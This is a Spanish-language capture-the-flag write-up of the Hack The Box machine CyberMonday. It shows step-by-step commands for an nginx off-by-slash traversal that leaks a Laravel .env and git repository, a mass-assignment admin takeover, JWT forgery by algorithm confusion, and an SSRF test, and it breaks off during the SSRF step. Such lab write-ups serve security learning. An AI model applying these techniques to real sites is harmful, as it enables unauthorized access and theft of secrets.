---
layout: post
title: CyberMonday - Hack The Box
date: 2025-11-2
categories: [Hack The Box, Linux]
tags:  [Linux]
image:
  path: htb-writeup-cybermonday/cybermonday.png
  alt: cybermonday
---

![logo](htb-writeup-cybermonday/cybermonday-logo.png){: .right w="200" h="200" }

Cybermonday es una máquina Linux de alta dificultad que muestra vulnerabilidades como off-by-slash, asignación masiva y falsificación de peticiones del lado del servidor (SSRF). El acceso inicial consiste en explotar una vulnerabilidad de asignación masiva en la aplicación web y ejecutar comandos de Redis mediante SSRF utilizando inyección CRLF. Para el movimiento lateral, se analiza el código fuente de la API y, posteriormente, se explota una vulnerabilidad LFI para obtener la contraseña del usuario `john`. La escalada de privilegios a `root` se logra mediante el uso de privilegios SUDO, lo que permite al usuario `john` crear y ejecutar un contenedor Docker desde cualquier archivo Docker Compose.


## Reconocimiento

### Nmap

Como en todas las maquinas que resolvemos empezamos con un escaneo de puertos basico para ver a lo que nos enfrentamos.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.228
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 13:51 CET
Initiating SYN Stealth Scan at 13:51
Scanning 10.10.11.228 [65535 ports]
Discovered open port 80/tcp on 10.10.11.228
Discovered open port 22/tcp on 10.10.11.228
Completed SYN Stealth Scan at 13:51, 14.92s elapsed (65535 total ports)
Nmap scan report for 10.10.11.228
Host is up, received user-set (0.22s latency).
Scanned at 2025-11-03 13:51:25 CET for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
           Raw packets sent: 72679 (3.198MB) | Rcvd: 72679 (2.907MB)
```

+ PORT 22
  - SSH

+ PORT 80
  - HTTP

### Nmap Servicios y Puertos

Una vez identificado los puertos vamos a escanear los servicios y versiones de lo que corre ahi.

```bash
nmap -p22,80 -sCV 10.10.11.228
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 13:55 CET
Nmap scan report for 10.10.11.228
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA)
|   256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA)
|_  256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519)
80/tcp open  http    nginx 1.25.1
|_http-server-header: nginx/1.25.1
|_http-title: Did not follow redirect to http://cybermonday.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds
```

El escaneo de servicios nos redirige a `cybermonday.htb`, voy a añadir el dominio a mi `/etc/hosts` y comprobar via firefox de que se trata este servidor.

```bash
echo "10.10.11.228 cybermonday.htb" >> /etc/hosts
```

## Web cybermonday.htb

```bash
curl -I http://cybermonday.htb
HTTP/1.1 200 OK
Server: nginx/1.25.1
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.1.20
Cache-Control: no-cache, private
Date: Mon, 03 Nov 2025 12:59:46 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjhNTGFZSmFnVjl2YU5ldk1hbXBMQnc9PSIsInZhbHVlIjoiSEtkQytQelNDeTVzUk02OVhISXdhNlpEVHVjb3ZNYVBVTWNQSyt5YndBdzdTdmN4UG9wSFd4VEwzSkZVUWQ4QU5UaTFuN1ovRzBTY3NaSDc0V2FJOGVMK1dIRld4TEloRE5rNWdUc3VMOTRnL05lcXRtdWpNOFo5ZDJNZ2VFMU4iLCJtYWMiOiJiMzdkYmYwMGQ2MTJiYmEzNWQzOGUxNzUzOTBlOGYzZDM4ZTZhYTBlYjhkNzc5YzNlMWQ4ZjQzZDYxNDJlNTA3IiwidGFnIjoiIn0%3D; expires=Mon, 03 Nov 2025 14:59:46 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: cybermonday_session=eyJpdiI6IkdzYmRrc2tlbjVSNTY2NmZ5T3BZT0E9PSIsInZhbHVlIjoiNFUwVXczYlRyV2x6eGRkWENJY0VwTVFsNkg3ZklpOGFEeEk1YmZnODJQVHpxSm1mQ05FRy9lSmplK0M5bFU5NHNxTFJ5YlhvUnZJZkNKWGxBbEZYdzI2MngvTGMrQ3k1Q1hvWGRRSDJiOFMvWW9CVmxTVGRRUDErNGNwUXh3UFEiLCJtYWMiOiIwNmJhOTcxYjI5M2QyYzM4M2ZlYzY5MGZlN2M2MjJiMmNlNDJhOWM4ZDViODI5ZjhiMDRkYjE1NDcxNWI4MjcyIiwidGFnIjoiIn0%3D; expires=Mon, 03 Nov 2025 14:59:46 GMT; Max-Age=7200; path=/; httponly; samesite=lax
```

Antes de entrar a firefox quiero que vean con curl que nos estamos enfrentando a un `laravel` con `PHP/8.1.20` pero todavia no sabemos la version del Framework. Me doy cuenta por como es el formato de las cookies y se parece mucho a `Laravel`

![](htb-writeup-cybermonday/cybermonday1.png)

En la parte superior de la web tenemos un boton `Products`

![](htb-writeup-cybermonday/cybermonday2.png)

Pero al darle click en `view` y despues en `buy` no pasa nada, es estatico.

![](htb-writeup-cybermonday/cybermonday3.png)

Tambien tenemos otros botones como `login` y `signup`

Vamos a registrarnos con el nombre de usuario mrincreible y loguearnos para testear desde adentro de la web.

![](htb-writeup-cybermonday/cybermonday4.png)

### Enumeracion Web Fuzz

```bash
gobuster dir -u http://cybermonday.htb -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cybermonday.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 358] [--> http://cybermonday.htb/login]
/login                (Status: 200) [Size: 5675]
/assets               (Status: 301) [Size: 169] [--> http://cybermonday.htb/assets/]
/home                 (Status: 302) [Size: 358] [--> http://cybermonday.htb/login]
/products             (Status: 200) [Size: 467331]
/signup               (Status: 200) [Size: 5823]
```

En esta parte usamos la herramienta gobuster para fuzzear por directorios, no encontramos gran cosa sin embargo estabamos observando bien de que se trata la version `nginx`... puede que exista una mala configuracion de `Off-By-Slash`.

Aca pueden leer un poco mas sobre el [Off-By-Slash](https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)

El gobuster de arriba se muestra un `/assets/`. Para comprobar si hay un `Off-By-Slash`, intentaré visitar /assets../ si el servidor está configurado correctamente, la reescritura no se producirá en absoluto y devolverá un error 404. Pero si devuelve algún otro código de estado, eso indica que el recorrido del directorio funcionó. 

```bash
curl -I http://cybermonday.htb/assets../
HTTP/1.1 403 Forbidden
Server: nginx/1.25.1
Date: Mon, 03 Nov 2025 20:21:04 GMT
Content-Type: text/html
Content-Length: 153
Connection: keep-alive
```

El `ERROR 402 Forbidden` significa que no tenemos permisos para ver la carpeta de atras, pero tambien significa que estamos retrocediendo.

Laravel almacena toda su información confidencial en un `.env` en la raíz del proyecto.

```bash
curl http://cybermonday.htb/assets../.env; echo
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

REDIS_BLACKLIST=flushall,flushdb
```

Que podemos sacar de un archivo como este?

- APP_KEY me puede servir para realizar un `ataque de deserializacion`
- Tambien hay credenciales de acceso a MySQL
- Hay dos comandos que estan blacklisteados `flushall` y `flushdb`
- Observamos que hay dos hosts en las bases de datos, `db` y `redis`... Puede ser que existan contenedores.

Lo siguiente sera fuzzear por el pequeño `Directory Path Traversal` con `FUFF`

![](htb-writeup-cybermonday/cybermonday5.png)

Vemos el proyecto en git, podemos extraerlo con la siguiente herramienta.

### Git Dumper

Primero tienen que instalarlo

```bash
pip3 install gitdumper
```

O tambien puede clonar el repositorio de github [git-dumper](https://github.com/arthaud/git-dumper.git)

```bash
❯ python3 git_dumper.py http://cybermonday.htb/assets../ ./proyect
[-] Testing http://cybermonday.htb/assets../.git/HEAD [200]
[-] Testing http://cybermonday.htb/assets../.git/ [403]
[-] Fetching common files
[-] Fetching http://cybermonday.htb/assets../.gitignore [200]
[-] Fetching http://cybermonday.htb/assets../.git/COMMIT_EDITMSG [200]
[-] Fetching http://cybermonday.htb/assets../.git/description [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-commit.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/commit-msg.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-commit.sample [404]
[-] http://cybermonday.htb/assets../.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-update.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-push.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-receive.sample [404]
[-] http://cybermonday.htb/assets../.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-receive.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/pre-rebase.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/index [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/info/packs [404]
[-] http://cybermonday.htb/assets../.git/objects/info/packs responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/info/exclude [200]
....
```

![](htb-writeup-cybermonday/cybermonday6.png)

## Source Code (Analisis de Codigo Fuente)

### Rutas

Dentro de la carpeta `/routes` hay un web.php que nos indica todas las rutas que existen en la app

```php
<?php

use App\Models\Product;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\TestController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\ChangelogController;
use App\Http\Controllers\DashboardController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome',['title' => 'Welcome']);
})->name('welcome');

Route::get('/products',[ProductController::class,'index'])->name('products');
Route::get('/product/{product:id}',[ProductController::class,'show'])->name('products.show');

Route::get('/logout',[AuthController::class,'destroy'])->name('logout');

Route::middleware('guest')->group(function(){

    Route::get('/signup',[AuthController::class,'registerForm'])->name('register.form');
    Route::post('/signup',[AuthController::class,'register'])->name('register');
    Route::get('/login',[AuthController::class,'loginForm'])->name('login.form');
    Route::post('/login',[AuthController::class,'login'])->name('login');

});

Route::prefix('home')->middleware('auth')->group(function(){

    Route::get('/',[HomeController::class,'index'])->name('home');

    Route::get('/profile',[ProfileController::class,'index'])->name('home.profile');
    Route::post('/update',[ProfileController::class,'update'])->name('home.profile.update');

});

Route::prefix('dashboard')->middleware('auth.admin')->group(function(){
        
    Route::get('/',[DashboardController::class,'index'])->name('dashboard');

    Route::get('/products',[ProductController::class,'create'])->name('dashboard.products');
    Route::post('/products',[ProductController::class,'store'])->name('dashboard.products.store');
    
    Route::get('/changelog',[ChangelogController::class,'index'])->name('dashboard.changelog');

});
```

En este script vemos algo nuevo como la ruta `dashboard` que al parecer solo lo tiene un usuario administrador, si intento visitar la ruta dashboard con mi usuario me sale un `ERROR 404`

![](htb-writeup-cybermonday/cybermonday7.png)

Pero si me deslogueo y quiero ir a `dashboard` me sale este error de laravel

![](htb-writeup-cybermonday/cybermonday8.png)

Encuentra el valor de `isAdmin` como nulo, es decir no soy administrador. Eso me da una idea de por donde puedo buscar en el proyecto.

Si me ubico en la raiz del proyecto puedo filtrar con grep `isAdmin`

```bash
grep -r "isAdmin"
app/Models/User.php:        'isAdmin' => 'boolean',
app/Http/Middleware/AuthenticateAdmin.php:        if(auth()->user()->isAdmin)
resources/views/partials/header.blade.php:                        @if(auth()->user()->isAdmin)
database/migrations/2014_10_12_000000_create_users_table.php:            $table->boolean('isAdmin')->default(0);
```

- resources/views/partials/header.blade.php

```php
                    
                    @if(auth()->user())
                        <a href="{{ route('home') }}"
                            class="border-transparent text-gray-900 hover:border-gray-300 hover:text-gray-700 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">Home</a>
                        @if(auth()->user()->isAdmin)
                            <a href="{{ route('dashboard') }}"
                                class="border-transparent text-gray-900 hover:border-gray-300 hover:text-gray-700 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">Dashboard</a>  
                        @endif
                    @endif

```

Esto hace una comprobacion de `auth()->user()->isAdmin`, si es administrador te deja ver el dashboard.

De esta manera podemos entender la logica de la aplicacion web. Quiero ver el codigo de la funcion `update` y `profile`.

### /app/Http/Controllers/ProfileController.php

```php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;

class ProfileController extends Controller
{
    public function index()
    {
        return view('home.profile', [
            'title' => 'Profile'
        ]);
    }

    public function update(Request $request)
    {
        $data = $request->except(["_token","password","password_confirmation"]);
        $user = User::where("id", auth()->user()->id)->first();

        if(isset($request->password) && !empty($request->password))
        {
            if($request->password != $request->password_confirmation)
            {
                session()->flash('error','Password dont match');
                return back();
            }

            $data['password'] = bcrypt($request->password);
        }

        $user->update($data);
        session()->flash('success','Profile updated');

        return back();
    }
}

```

El código anterior muestra que para las actualizaciones de perfil obtiene el User y actualiza los datos. Sin embargo, existe una vulnerabilidad de asignación masiva. Toma todos los campos de la solicitud POST excepto `_token`, `password`, y `password_confirmation` y luego (tras actualizar también la contraseña con un hash bcrypt si es necesario) actualiza el objeto de usuario. Esto significa que si envío un `isAdmin` con el valor 1 en un nuevo campo, se puede actualizar a Admin.

Como sabemos el valor?... Por esto!

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('users', function (Blueprint $table) {
            $table->id();
            $table->string('username')->unique();
            $table->string('email')->unique();
            $table->string('password');
            $table->boolean('isAdmin')->default(0);
            $table->rememberToken();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('users');
    }
};
```

Esta parte setea un valor por defecto a un usuario normal `$table->boolean('isAdmin')->default(0);` 

### Ataque de Asignacion Masiva (Mass Assignament Attack)

Vamos a llevarlo a la practica, interceptamos la peticion POST

![](htb-writeup-cybermonday/cybermonday9.png)

Y agregamos isAdmin con el valor 1

![](htb-writeup-cybermonday/cybermonday10.png)

Dejamos pasar la peticion..... YYY WAlAAA!

![](htb-writeup-cybermonday/cybermonday11.png)

Al actualizar la pagina vemos que el boton `dashboard` permanece en la barra de navegacion.

### Enumerar como Administrador

![](htb-writeup-cybermonday/cybermonday12.png)

- En `products` podemos agregar un producto insertando nombre, descripcion y valor del producto.
- El boton `Changelog` contiene los cambios que se le realizo a la pagina web a medida que fue cambiando de versiones. 

![](htb-writeup-cybermonday/cybermonday13.png)

Si hacemos click en el siguiente enlace `http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77` no nos lleva a ningun lado, pasa eso porque nos estamos enfrentando a un subdominio del servidor web... Vamos a incorporar al `/etc/hosts` `webhooks-api-beta.cybermonday.htb`

## Enumeracion de API

### Enumerar webhooks-api-beta

```bash
❯ curl -I http://webhooks-api-beta.cybermonday.htb/webhooks
HTTP/1.1 200 OK
Server: nginx/1.25.1
Date: Tue, 04 Nov 2025 14:45:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=156f9911f5be9651af979fd864c8bd60; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

❯ curl -I http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77
HTTP/1.1 200 OK
Server: nginx/1.25.1
Date: Tue, 04 Nov 2025 14:46:19 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=17cd48ae75bf7fc05568604f9730bf2a; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

Obtuvimos estas respuestas con curl, nada relevante....

Pero si probamos de esta manera....

```bash
curl -s http://webhooks-api-beta.cybermonday.htb/webhooks; echo
{"status":"error","message":"Unauthorized"}
```

Ahora obtenemos un error de autorizacion

La raiz devuelve todo un JSON con el funcionamiento de la API completa.

```bash
curl -s http://webhooks-api-beta.cybermonday.htb/ | jq
{
  "status": "success",
  "message": {
    "routes": {
      "/auth/register": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/auth/login": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/webhooks": {
        "method": "GET"
      },
      "/webhooks/create": {
        "method": "POST",
        "params": [
          "name",
          "description",
          "action"
        ]
      },
      "/webhooks/delete:uuid": {
        "method": "DELETE"
      },
      "/webhooks/:uuid": {
        "method": "POST",
        "actions": {
          "sendRequest": {
            "params": [
              "url",
              "method"
            ]
          },
          "createLogFile": {
            "params": [
              "log_name",
              "log_content"
            ]
          }
        }
      }
    }
  }
}
```

Muy bien, tenemos todo lo que hace la API que estamos enumerando, vamos a tomar nota de todo los parametros y metodos para interactuar rapido con la API.

```bash
- POST http://webhooks-api-beta.cybermonday.htb/auth/register {"username", "password"}
- POST http://webhooks-api-beta.cybermonday.htb/auth/login {"username", "password"}
- GET http://webhooks-api-beta.cybermonday.htb/webhooks 
- POST http://webhooks-api-beta.cybermonday.htb/webhooks/create {"name", "description", "action"}
- DELETE http://webhooks-api-beta.cybermonday.htb/webhooks/delete
- POST http://webhooks-api-beta.cybermonday.htb/webhooks/:uuid {"url", "method"}
```

Una vez que tengo esto, voy a intentar interactuar con la API

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/auth/login" -H 'Content-Type: application/json' -d {}; echo
{"status":"error","message":"\"username\" not defined"}
```

Me pide un usuario, voy a probar con el usuario `mrincreible`, este tiene privilegios de administrador en la web... 

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/auth/login" -H 'Content-Type: application/json' -d '{"username": "mrincreible", "password":"mrincreible"}'; echo
{"status":"error","message":"Invalid Credentials"}
```

Esto tambien me falla, pero por lo menos devuelve una respuesta... ahora nos damos cuenta que la web no comparte credenciales con esta API.

Vamos a registrar un usuario:

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/auth/register" -H 'Content-Type: application/json' -d '{"username": "mrincreible", "password":"mrincreible"}'; echo
{"status":"success","message":"success"}
```

Genial!!!... Ahora iniciemos sesion

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/auth/login" -H 'Content-Type: application/json' -d '{"username": "mrincreible", "password":"mrincreible"}'; echo
{"status":"success","message":{"x-access-token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtcmluY3JlaWJsZSIsInJvbGUiOiJ1c2VyIn0.GALVIl05sYZQYr-eGxkdHlnDTz71qZUDqAFVzOryTsO7-QkeCCl3-GZneP7QXCJyi-5KFji97HxbOyx43QDVGHDE0n7YW0qjAvUTV0U9pbCeTMYLNlre6rgQyuher2Cxd2Fkc86k79GvlpeFWI8KmkO8ElfkdgnvlwC3Uk0apOP7XmsuUyG5f02D8m2o15CxN9lc-Jv8ryPJK6kBsloeHUWUWBD44oE_tqeXEnVd02c22bbIy7K7dBGWD1Rcc4Zf0lYR0RlxRGW0rLmMAbPnV2A4H6NrDGMkg3HE5nSrQgJhtkMYNm3XYErTgFfOTkTW6_ZIeWlanqVDT8qac2sSrg"}}
```

Esto es Excelente!!!... Ahora tenemos un token, esto quiere decir que podemos hablar con el endpoint `webhooks` como intentamos al principio pero no tuvimos autorizacion.

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks" -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" | jq .
{
  "status": "success",
  "message": [
    {
      "id": 1,
      "uuid": "fda96d32-e8c8-4301-8fb3-c821a316cf77",
      "name": "tests",
      "description": "webhook for tests",
      "action": "createLogFile"
    }
  ]
}
```

Vamos a seguir interactuando con la api pero esta vez creando un `webhook`

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/create" -d '{"name": "test", "description":"test", "action":"test"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" | jq .
{
  "status": "error",
  "message": "Unauthorized"
}
```

Al parecer no tenemos acceso a crear uno, tenemos que convertirnos en administrador y volver a conseguir privilegios.

Quiero decir que este punto es complicado?... Porque lo vamos a intentar de todo y sin exito nos vamos a frustar. Lo unico que nos queda sera `FUZZEAR` en el nuevo subdominio que debimos haberlo hecho mucho antes. `webhooks-api-beta.cybermonday.htb`

![](htb-writeup-cybermonday/cybermonday14.png)

![](htb-writeup-cybermonday/cybermonday15.png)

### Forge JWT (jwks.json)

El conjunto de claves web JSON (JWKS) es un conjunto de claves que contienen las claves públicas utilizadas para verificar cualquier elemento. Emitido por el y se firmó utilizando el algoritmo de firma RS256.

Al crear aplicaciones y API en Auth0, se admiten dos algoritmos para la firma. RS256 . RS256 y HS256 genera una firma asimétrica, lo que significa que se debe usar una clave privada para firmar el JWT y una clave pública diferente para verificar la firma.

Este `jwks.json` contiente los elementos RSA de la clave publica:

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/jwks.json" | jq
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
      "e": "AQAB"
    }
  ]
}
```

Tambien si le pasamos nuestro token a la web jwt.io nos devuelve esta informacion

![](htb-writeup-cybermonday/cybermonday16.png)

Hay una tecnica que publico [Portswigger](https://portswigger.net/web-security/jwt/algorithm-confusion) llamada Algorithm confusion (Confusion de Algoritmos).

Este ataque basicamente consiste en generar nuevos `JWT` abusando de un cambio de algoritmo de RSA a H256, este `jwks.json` contiene la informacion que me sirve para crear nuevos `JWT`... En otras palabras puedo generar el JWT del administrador y secuestra la sesion.

Existe una herramienta que te automatiza el proceso para obtener la clave publica o `PEM`. [jwt_tool.py](https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py)

![](htb-writeup-cybermonday/cybermonday17.png)

```bash
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApvezvAKCOgxwsiyV6PRJ
fGMul+WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP/8jJ7WA2gDa8oP3N2J8z
Fyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn7
97IlIYr6Wqfc6ZPn1nsEhOrwO+qSD4Q24FVYeUxsn7pJ0oOWHPD+qtC5q3BR2M/S
xBrxXh9vqcNBB3ZRRA0H0FDdV6Lp/8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhn
gysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh1
6wIDAQAB
-----END PUBLIC KEY-----
```

Vamos a abrir Burpsuite y instalar esta extension

![](htb-writeup-cybermonday/cybermonday18.png)

Luego nos vamos a la pestaña de `JWT editor` y vamos a hacer click en `New RSA Key`.

![](htb-writeup-cybermonday/cybermonday19.png)

Clickeamos en `generate` esto nos va a dar un clave publica por defecto pero lo reemplazamos por la clave publica que generamos con `jwt_tool` en el cuadrado donde dice `Key`

![](htb-writeup-cybermonday/cybermonday20.png)

Esa misma clave que pegue la voy a llevar al decoder para transformarlo en `base64`.

![](htb-writeup-cybermonday/cybermonday21.png)

Hacemos click en `New Symmetric Key`

![](htb-writeup-cybermonday/cybermonday22.png)

Tambien hacemos click en `generate` y remplazamos el valor de `k` por nuestra clave publica que convertimos a `base64`, apreto ok y listo.

![](htb-writeup-cybermonday/cybermonday23.png)

En esta parte solo me queda enviar una peticion y interceptarla con burp y enviarla al repeater

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/create" -d '{"name": "test", "description":"test", "action":"test"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" --proxy http://127.0.0.1:8080
```

![](htb-writeup-cybermonday/cybermonday24.png)

Tengo que modificar el valor del algoritmo RS256 a HS256 y mi role de `user` a `admin` posterior a eso darle click a `sign` para firmar.

![](htb-writeup-cybermonday/cybermonday25.png)

Ahora la respuesta se va a ver diferente, antes nos mostraba un contenido en JSON de Unautorized

![](htb-writeup-cybermonday/cybermonday26.png)

Ahora nos sale un `ERROR 404`, tambien vemos que en la parte de `action` tenemos que pasarle el dato `sendRequest` o `createLogFile`

![](htb-writeup-cybermonday/cybermonday27.png)

Una vez que el servidor ya tiene mi token como Administrador, si realizamos una peticion para ver mis webhooks... Ya me sale el que cree recien con Burpsuite, en este punto ya se podria decir que somos administradores y podemos interactuar aun mejor con la `API`.

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks" -H "x-access-token: $TOKEN" | jq .
{
  "status": "success",
  "message": [
    {
      "id": 1,
      "uuid": "fda96d32-e8c8-4301-8fb3-c821a316cf77",
      "name": "tests",
      "description": "webhook for tests",
      "action": "createLogFile"
    },
    {
      "id": 2,
      "uuid": "0a5df7f0-d1fd-4369-8d29-290bf0f3a469",
      "name": "test",
      "description": "test",
      "action": "sendRequest"
    }
  ]
}
```

Quiero hacerles recuerdo de que tenemos una nota de como funcion la API. Por eso es bueno documentar todo!

```bash
- POST http://webhooks-api-beta.cybermonday.htb/auth/register {"username", "password"}
- POST http://webhooks-api-beta.cybermonday.htb/auth/login {"username", "password"}
- GET http://webhooks-api-beta.cybermonday.htb/webhooks 
- POST http://webhooks-api-beta.cybermonday.htb/webhooks/create {"name", "description", "action"}
- DELETE http://webhooks-api-beta.cybermonday.htb/webhooks/delete
- POST http://webhooks-api-beta.cybermonday.htb/webhooks/:uuid {"url", "method"}
```

En el enpoint de `/webhooks/:uuid` podemos pasarle nuestro identificador `0a5df7f0-d1fd-4369-8d29-290bf0f3a469` que acabamos de crear.

Y nos pide ciertos datos como `url`, `method`.

### SSRF

Si probamos con poner nuestra ip en url y por el metodo `GET`

![](htb-writeup-cybermonday/cybermonday28.png)

Nos llega la peticion que estamos realizando, se trata de un SSRF (Server-Side Request Forgery)

Quiero probar algo, que pasa si cambio el metodo por mi nombre `mrincreible`...

![](htb-writeup-cybermonday/cybermonday29.png)

